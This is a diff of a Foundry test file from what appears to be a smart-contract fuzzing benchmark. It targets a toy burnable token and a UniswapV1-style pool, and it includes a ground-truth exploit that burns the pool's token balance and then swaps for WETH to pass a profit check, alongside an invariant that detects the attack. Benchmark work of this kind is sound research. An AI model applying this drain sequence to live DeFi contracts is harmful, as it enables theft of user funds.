@@ -10,7 +10,7 @@ import "benchmarks/toy/TokenBurn/BurningToken.sol";
 import "benchmarks/toy/TokenBurn/Handler.sol";
 
 contract TokenBurnTest is Test {
-    address owner;
+    address constant owner = address(0xdeadbeef);
     address attacker;
 
     BurningToken token;
@@ -18,19 +18,18 @@ contract TokenBurnTest is Test {
     UniswapV1 uniswap;
     TokenBurnHandler handler;
 
-    uint256 public totalSupply = 1000 ether;
-    uint256 public feeRate = 15;
+    uint256 constant totalSupply = 1000 ether;
+    uint256 constant feeRate = 15;
 
-    uint256 public attackerInitBalance = 0 ether;
-    uint256 public attackerInitToken = 1 ether;
+    uint256 constant attackerInitBalance = 0 ether;
+    uint256 constant attackerInitToken = 1 ether;
 
-    uint256 public uniswapInitBalance = 10 ether;
-    uint256 public uniswapInitToken = 10 ether;
+    uint256 constant uniswapInitBalance = 10 ether;
+    uint256 constant uniswapInitToken = 10 ether;
 
-    uint256 public requiredBalance = attackerInitToken;
+    uint256 constant requiredBalance = attackerInitToken;
 
     function setUp() public {
-        owner = address(0xdeadbeef);
         attacker = address(this);
 
         vm.startPrank(owner);
@@ -54,32 +53,21 @@ contract TokenBurnTest is Test {
         excludeContract(address(token));
         excludeContract(address(weth));
         excludeContract(address(uniswap));
-
-        token.approve(address(uniswap), UINT256_MAX);
-        weth.approve(address(uniswap), UINT256_MAX);
-    }
-
-    function printBalance() internal {
-        emit log_named_decimal_uint(
-            "WETH Balance",
-            weth.balanceOf(attacker),
-            18
-        );
-        emit log_named_decimal_uint(
-            "Token Balance",
-            token.balanceOf(attacker),
-            18
-        );
     }
 
     function testAttackGT() public {
+        token.approve(address(uniswap), UINT256_MAX);
+        weth.approve(address(uniswap), UINT256_MAX);
         token.burn(address(uniswap), token.balanceOf(address(uniswap)) - 1);
         uniswap.swapTokenToWETH(token.balanceOf(attacker));
-        printBalance();
-        require(weth.balanceOf(attacker) >= requiredBalance, "Attack Failed!");
+        require(attackGoal(), "Attack Failed!");
     }
 
-    function invariantNoProfit() public {
-        assertLt(weth.balanceOf(attacker), requiredBalance);
+    function attackGoal() public view returns (bool) {
+        return weth.balanceOf(attacker) >= requiredBalance;
+    }
+
+    function invariantSafe() public view {
+        require(!attackGoal(), "Attack Happened!");
     }
 }
